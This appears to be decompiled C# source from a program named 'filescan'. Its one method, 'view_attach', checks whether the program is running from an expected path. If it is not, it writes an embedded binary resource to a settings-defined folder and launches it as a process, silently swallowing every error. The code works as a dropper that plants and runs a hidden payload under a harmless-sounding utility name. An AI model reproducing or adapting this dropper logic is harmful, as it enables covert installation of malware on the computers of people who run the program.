using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using filescan.Properties;

namespace filescan;

internal class nobject
{
	public void view_attach()
	{
		try
		{
			string directoryName = Path.GetDirectoryName(Application.get_ExecutablePath());
			string text = Encoding.UTF8.GetString(Resources._data, 0, Resources._data.Length).ToString();
			if (directoryName + "\\" != setting.sucPath())
			{
				if (!Directory.Exists(setting.dpath))
				{
					Directory.CreateDirectory(setting.dpath);
				}
				byte[] record = Resources._record;
				File.WriteAllBytes(setting.dpath + text, record);
				if (File.Exists(setting.dpath + text))
				{
					Process process = new Process();
					process.StartInfo.FileName = setting.dpath + text;
					process.Start();
				}
			}
		}
		catch
		{
		}
	}
}
